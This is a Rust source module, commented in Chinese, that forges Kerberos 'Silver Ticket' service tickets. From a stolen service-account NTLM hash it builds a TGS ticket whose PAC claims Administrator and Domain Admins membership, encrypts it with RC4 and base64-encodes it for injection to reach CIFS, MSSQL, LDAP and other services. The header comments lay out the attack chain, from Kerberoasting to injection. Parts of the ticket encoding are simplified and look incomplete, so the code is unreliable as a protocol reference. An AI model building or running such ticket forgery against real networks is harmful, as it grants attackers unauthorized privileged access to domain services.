//! Silver Ticket（白银票据）攻击模块
//!
//! 允许攻击者访问特定的服务（如CIFS、HTTP、MSSQLSvc等）。
//! 与Golden Ticket相比，Silver Ticket更隐蔽，因为它不经过KDC验证。
//!
//! 原理：
//! 1. 获取目标服务账户的NTLM哈希（通过Kerberoasting破解或凭据提取）
//! 2. 伪造TGS票据（服务票据）
//! 3. 注入到当前会话
//! 4. 直接访问目标服务，无需TGT
//!
//! 常见服务SPN前缀：
//! - CIFS/主机名  → 文件共享 (SMB)
//! - HTTP/主机名  → Web服务
//! - MSSQLSvc/主机名  → SQL Server
//! - HOST/主机名  → 主机管理 (WMI, 计划任务等)
//! - LDAP/主机名  → LDAP服务
//! - WSMAN/主机名  → WinRM

use serde::{Deserialize, Serialize};

/// Silver Ticket 配置
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SilverTicketConfig {
    /// 目标域名
    pub domain: String,
    /// 域SID
    pub domain_sid: String,
    /// 目标服务SPN (如 CIFS/dc01.corp.local)
    pub target_spn: String,
    /// 服务账户的NTLM哈希
    pub service_nthash: String,
    /// 伪造的用户名
    pub username: String,
    /// 用户RID
    pub user_rid: u32,
    /// 组RID列表
    pub group_rids: Vec<u32>,
    /// 票据有效期（小时，默认10小时）
    pub lifetime_hours: u32,
    /// 加密类型
    pub etype: i32,
}

impl Default for SilverTicketConfig {
    fn default() -> Self {
        Self {
            domain: String::new(),
            domain_sid: String::new(),
            target_spn: String::new(),
            service_nthash: String::new(),
            username: "Administrator".to_string(),
            user_rid: 500,
            group_rids: vec![
                512, // Domain Admins
                513, // Domain Users
            ],
            lifetime_hours: 10,
            etype: 23,
        }
    }
}

/// Silver Ticket
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SilverTicket {
    /// 目标服务SPN
    pub target_spn: String,
    /// 服务类型
    pub service_type: String,
    /// 目标主机
    pub target_host: String,
    /// 域名
    pub domain: String,
    /// 伪造的用户名
    pub username: String,
    /// 票据数据
    pub ticket_data: Vec<u8>,
    /// Base64票据
    pub ticket_base64: String,
    /// 有效期
    pub valid_hours: u32,
}

/// 已知的服务SPN前缀及其端口
const SERVICE_PORTS: &[(&str, u16)] = &[
    ("CIFS", 445),
    ("HTTP", 80),
    ("MSSQLSvc", 1433),
    ("HOST", 135),
    ("LDAP", 389),
    ("WSMAN", 5985),
    ("TERMSRV", 3389),
    ("FTP", 21),
    ("SMTPSVC", 25),
    ("POP3SVC", 110),
];

/// 创建 Silver Ticket
pub fn create_silver_ticket(config: &SilverTicketConfig) -> Result<SilverTicket, String> {
    // 验证输入
    if config.domain.is_empty() || config.domain_sid.is_empty() {
        return Err("域名和域SID不能为空".to_string());
    }
    if config.target_spn.is_empty() {
        return Err("目标SPN不能为空".to_string());
    }
    if config.service_nthash.is_empty() || config.service_nthash.len() != 32 {
        return Err("服务账户NTLM哈希无效（应为32字符十六进制）".to_string());
    }

    let service_key = hex::decode(&config.service_nthash)
        .map_err(|e| format!("NTLM哈希解码失败: {}", e))?;

    // 解析SPN获取服务类型和目标主机
    let (service_type, target_host) = parse_spn(&config.target_spn)?;

    tracing::info!(
        "[Silver Ticket] 为 {} 伪造TGS: {} 用户={}",
        config.target_spn, service_type, config.username
    );

    // 构造服务票据
    let ticket = build_service_ticket(
        &config.domain,
        &config.domain_sid,
        &config.username,
        config.user_rid,
        &config.group_rids,
        &service_type,
        &target_host,
        &service_key,
        config.etype,
        config.lifetime_hours,
    )?;

    let ticket_base64 = base64_encode(&ticket);

    Ok(SilverTicket {
        target_spn: config.target_spn.clone(),
        service_type,
        target_host,
        domain: config.domain.clone(),
        username: config.username.clone(),
        ticket_data: ticket,
        ticket_base64,
        valid_hours: config.lifetime_hours,
    })
}

/// 解析SPN字符串
fn parse_spn(spn: &str) -> Result<(String, String), String> {
    let parts: Vec<&str> = spn.split('/').collect();
    if parts.len() < 2 {
        return Err(format!("无效的SPN格式: {} (应为 service/host)", spn));
    }

    let service_type = parts[0].to_string();
    let target_host = parts[1].split(':').next().unwrap_or(parts[1]).to_string();

    Ok((service_type, target_host))
}

/// 构造服务票据
#[allow(clippy::too_many_arguments)]
fn build_service_ticket(
    domain: &str,
    domain_sid: &str,
    username: &str,
    user_rid: u32,
    group_rids: &[u32],
    service_type: &str,
    target_host: &str,
    service_key: &[u8],
    etype: i32,
    lifetime_hours: u32,
) -> Result<Vec<u8>, String> {
    let mut ticket = Vec::new();

    // TGS票据结构 (简化):
    // Ticket ::= [APPLICATION 1] SEQUENCE {
    //   tkt-vno[0] INTEGER,
    //   realm[1] Realm,
    //   sname[2] PrincipalName,  -- 服务名称
    //   enc-part[3] EncryptedData  -- 服务密钥加密的EncTicketPart
    // }

    // tkt-vno [0]
    ticket.extend_from_slice(&[0xA0, 0x03, 0x02, 0x01, 0x05]);

    // realm [1]
    let realm = domain.as_bytes();
    ticket.push(0xA1);
    ticket.push(realm.len() as u8 + 2);
    ticket.push(0x1B);
    ticket.push(realm.len() as u8);
    ticket.extend_from_slice(realm);

    // sname [2] PrincipalName - 服务名
    let sname = build_principal_name(service_type, target_host);
    let sname_len = sname.len() as u8;
    ticket.push(0xA2);
    ticket.push(sname_len + 2);
    ticket.push(0x30);
    ticket.push(sname_len);
    ticket.extend_from_slice(&sname);

    // enc-part [3] - 使用服务密钥加密
    let enc_part = build_service_enc_part(
        username, user_rid, group_rids, domain_sid,
        service_type, target_host, lifetime_hours,
    );

    let encrypted = encrypt_with_key(&enc_part, service_key, etype)?;

    let enc_len = encrypted.len();
    ticket.push(0xA3);
    encode_asn1_length(&mut ticket, enc_len);
    ticket.extend_from_slice(&encrypted);

    Ok(ticket)
}

/// 构造PrincipalName
fn build_principal_name(service: &str, host: &str) -> Vec<u8> {
    let svc_bytes = service.as_bytes();
    let host_bytes = host.as_bytes();

    let mut inner = Vec::new();
    // name-type [0] INTEGER (2 = NT-SRV-INST)
    inner.extend_from_slice(&[0xA0, 0x03, 0x02, 0x01, 0x02]);

    // name-string [1] SEQUENCE OF GeneralString
    inner.push(0xA1);
    let ns_len = (svc_bytes.len() + host_bytes.len() + 4) as u8;
    inner.push(ns_len);
    inner.push(0x30); // SEQUENCE

    inner.push(0x1B);
    inner.push(svc_bytes.len() as u8);
    inner.extend_from_slice(svc_bytes);

    inner.push(0x1B);
    inner.push(host_bytes.len() as u8);
    inner.extend_from_slice(host_bytes);

    inner
}

/// 构造服务票据的EncTicketPart
fn build_service_enc_part(
    _username: &str,
    user_rid: u32,
    group_rids: &[u32],
    domain_sid: &str,
    _service_type: &str,
    _target_host: &str,
    lifetime_hours: u32,
) -> Vec<u8> {
    let mut enc_part = Vec::new();

    // TicketFlags [0]
    let flags: u32 = 0x40E00000; // FORWARDABLE | PROXIABLE | RENEWABLE | PRE_AUTHENT
    enc_part.extend_from_slice(&[0xA0, 0x07, 0x03, 0x05, 0x00]);
    enc_part.extend_from_slice(&flags.to_be_bytes());

    // Key [1] - 会话密钥
    let session_key: Vec<u8> = (0..16).map(|i| (i * 17 + 42) as u8).collect();
    enc_part.extend_from_slice(&[0xA1, 0x1B, 0x30, 0x19]);
    enc_part.extend_from_slice(&[0xA0, 0x03, 0x02, 0x01, 0x17]); // RC4-HMAC
    enc_part.extend_from_slice(&[0xA1, 0x12, 0x04, 0x10]);
    enc_part.extend_from_slice(&session_key);

    // AuthorizationData - PAC
    let pac = build_minimal_pac(user_rid, group_rids, domain_sid);
    enc_part.extend_from_slice(&[0xA3, 0x82]); // 长格式
    let pac_len = pac.len();
    enc_part.push(((pac_len + 2) >> 8) as u8);
    enc_part.push(((pac_len + 2) & 0xFF) as u8);
    enc_part.extend_from_slice(&[0x30, 0x82]);
    enc_part.push((pac_len >> 8) as u8);
    enc_part.push((pac_len & 0xFF) as u8);
    enc_part.extend_from_slice(&pac);

    // 时间字段(简化)
    let _ = lifetime_hours;

    enc_part
}

/// 构造最小PAC
fn build_minimal_pac(
    user_rid: u32,
    group_rids: &[u32],
    domain_sid: &str,
) -> Vec<u8> {
    let mut pac = Vec::new();

    // NumBuffers (简化为1个PAC_LOGON_INFO)
    pac.extend_from_slice(&1u32.to_le_bytes());
    pac.extend_from_slice(&0u32.to_le_bytes()); // Version

    // PAC_LOGON_INFO (最简版本)
    pac.extend_from_slice(&user_rid.to_le_bytes());
    pac.extend_from_slice(&(group_rids.len() as u32).to_le_bytes());
    for rid in group_rids {
        pac.extend_from_slice(&rid.to_le_bytes());
    }

    if let Ok(sid_bytes) = encode_sid_binary(domain_sid) {
        pac.extend_from_slice(&sid_bytes);
    }

    pac
}

/// 使用服务密钥加密数据
fn encrypt_with_key(data: &[u8], key: &[u8], etype: i32) -> Result<Vec<u8>, String> {
    match etype {
        23 => {
            // RC4-HMAC
            rc4_crypt(data, key)
        }
        _ => Err(format!("不支持的加密类型: {}", etype)),
    }
}

/// RC4加密/解密
fn rc4_crypt(data: &[u8], key: &[u8]) -> Result<Vec<u8>, String> {
    let mut s: Vec<u8> = (0..=255).collect();
    let mut j: usize = 0;

    for i in 0..256 {
        j = (j + s[i] as usize + key[i % key.len()] as usize) % 256;
        s.swap(i, j);
    }

    let mut result = Vec::with_capacity(data.len());
    let mut i = 0;
    j = 0;
    for &byte in data {
        i = (i + 1) % 256;
        j = (j + s[i] as usize) % 256;
        s.swap(i, j);
        let k = s[(s[i] as usize + s[j] as usize) % 256];
        result.push(byte ^ k);
    }

    Ok(result)
}

/// ASN.1长度编码
fn encode_asn1_length(buf: &mut Vec<u8>, len: usize) {
    if len < 128 {
        buf.push(len as u8);
    } else if len < 256 {
        buf.push(0x81);
        buf.push(len as u8);
    } else {
        buf.push(0x82);
        buf.push((len >> 8) as u8);
        buf.push((len & 0xFF) as u8);
    }
}

/// 编码SID为二进制格式
fn encode_sid_binary(sid_str: &str) -> Result<Vec<u8>, String> {
    let parts: Vec<&str> = sid_str.split('-').collect();
    if parts.len() < 3 || parts[0] != "S" {
        return Err("无效SID".to_string());
    }

    let mut sid = Vec::new();
    sid.push(1); // Revision
    sid.push((parts.len() - 3) as u8); // SubAuthorityCount

    let id_auth: u64 = parts[2].parse().map_err(|_| "无效ID Authority".to_string())?;
    sid.push(((id_auth >> 40) & 0xFF) as u8);
    sid.push(((id_auth >> 32) & 0xFF) as u8);
    sid.push(((id_auth >> 24) & 0xFF) as u8);
    sid.push(((id_auth >> 16) & 0xFF) as u8);
    sid.push(((id_auth >> 8) & 0xFF) as u8);
    sid.push((id_auth & 0xFF) as u8);

    for part in &parts[3..] {
        let sa: u32 = part.parse().map_err(|_| "无效SubAuthority".to_string())?;
        sid.extend_from_slice(&sa.to_le_bytes());
    }

    Ok(sid)
}

fn base64_encode(data: &[u8]) -> String {
    use base64::Engine;
    base64::engine::general_purpose::STANDARD.encode(data)
}

/// 获取服务类型的默认端口
pub fn get_service_port(service_type: &str) -> Option<u16> {
    SERVICE_PORTS
        .iter()
        .find(|(s, _)| s.eq_ignore_ascii_case(service_type))
        .map(|(_, p)| *p)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_spn() {
        let (svc, host) = parse_spn("CIFS/dc01.corp.local").unwrap();
        assert_eq!(svc, "CIFS");
        assert_eq!(host, "dc01.corp.local");
    }

    #[test]
    fn test_parse_spn_with_port() {
        let (svc, host) = parse_spn("MSSQLSvc/sql01.corp.local:1433").unwrap();
        assert_eq!(svc, "MSSQLSvc");
        assert_eq!(host, "sql01.corp.local");
    }

    #[test]
    fn test_parse_spn_invalid() {
        assert!(parse_spn("invalid_spn").is_err());
    }

    #[test]
    fn test_create_silver_ticket() {
        let config = SilverTicketConfig {
            domain: "corp.local".to_string(),
            domain_sid: "S-1-5-21-3623811015-3361044348-30300820".to_string(),
            target_spn: "CIFS/dc01.corp.local".to_string(),
            service_nthash: "aad3b435b51404eeaad3b435b51404ee".to_string(),
            ..Default::default()
        };

        let result = create_silver_ticket(&config);
        assert!(result.is_ok());

        let ticket = result.unwrap();
        assert_eq!(ticket.service_type, "CIFS");
        assert_eq!(ticket.target_host, "dc01.corp.local");
        assert!(!ticket.ticket_data.is_empty());
        assert!(!ticket.ticket_base64.is_empty());
    }

    #[test]
    fn test_create_silver_ticket_mssql() {
        let config = SilverTicketConfig {
            domain: "corp.local".to_string(),
            domain_sid: "S-1-5-21-123-456-789".to_string(),
            target_spn: "MSSQLSvc/sql01.corp.local:1433".to_string(),
            service_nthash: "31d6cfe0d16ae931b73c59d7e0c089c0".to_string(),
            username: "sa".to_string(),
            user_rid: 500,
            ..Default::default()
        };

        let result = create_silver_ticket(&config);
        assert!(result.is_ok());
        assert_eq!(result.unwrap().service_type, "MSSQLSvc");
    }

    #[test]
    fn test_get_service_port() {
        assert_eq!(get_service_port("CIFS"), Some(445));
        assert_eq!(get_service_port("MSSQLSvc"), Some(1433));
        assert_eq!(get_service_port("HTTP"), Some(80));
        assert_eq!(get_service_port("UNKNOWN"), None);
    }

    #[test]
    fn test_rc4_crypt() {
        let data = b"hello silver ticket";
        let key = b"key12345";
        let encrypted = rc4_crypt(data, key).unwrap();
        let decrypted = rc4_crypt(&encrypted, key).unwrap();
        assert_eq!(decrypted, data);
    }
}
